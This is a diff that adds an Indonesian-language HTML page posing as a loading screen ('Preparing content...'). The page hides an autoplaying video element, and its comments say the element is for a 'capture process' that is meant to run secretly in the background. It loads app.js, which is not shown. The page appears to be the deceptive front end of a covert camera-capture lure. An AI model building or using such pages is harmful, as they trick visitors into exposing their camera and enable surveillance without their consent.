@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Memuat...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #121212;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .container {
+            text-align: center;
+        }
+        /* Spinner Loading Animasi */
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #333;
+            border-top: 5px solid #00ffcc;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Video disembunyikan agar proses berjalan diam-diam di background */
+        #cameraPreview {
+            display: none;
+        }
+        #status {
+            font-size: 16px;
+            color: #a0a0a0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="spinner"></div>
+        <h2>Menyiapkan konten...</h2>
+        <p id="status">Mohon tunggu sebentar...</p>
+    </div>
+
+    <!-- Elemen video tersembunyi untuk proses capture -->
+    <video id="cameraPreview" autoplay playsinline muted></video>
+
+    <!-- Panggil file app.js -->
+    <script src="app.js"></script>
+</body>
+</html>
